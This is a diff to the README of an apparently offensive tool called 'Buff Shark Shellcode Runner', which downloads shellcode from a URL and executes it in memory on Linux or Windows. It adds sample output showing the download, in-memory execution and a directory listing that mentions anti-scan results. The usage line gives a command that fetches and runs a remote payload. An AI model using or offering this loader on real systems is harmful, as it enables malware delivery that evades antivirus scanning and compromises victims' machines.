@@ -11,3 +11,14 @@ This script utilizes mmap(for linux) and win32 api wrappers (for windows) to exe
 
 ## Usage
 Example: `python3 buffshark.py -u http://127.0.0.1:8080/shellcode.bin -a [win/nix]`
+
+```
+==========================
+Buff Shark Shellcode Runner
+ Author: Momo Nguyen 
+==========================
+[+] Downloading shellcode...
+[+] 49 Bytes Downloaded!
+[+] Running shellcode in memory...
+README.md  antiscan.PNG  antiscanres.PNG  buffshark.exe  buffshark.py  shell.bin  shellcode
+```
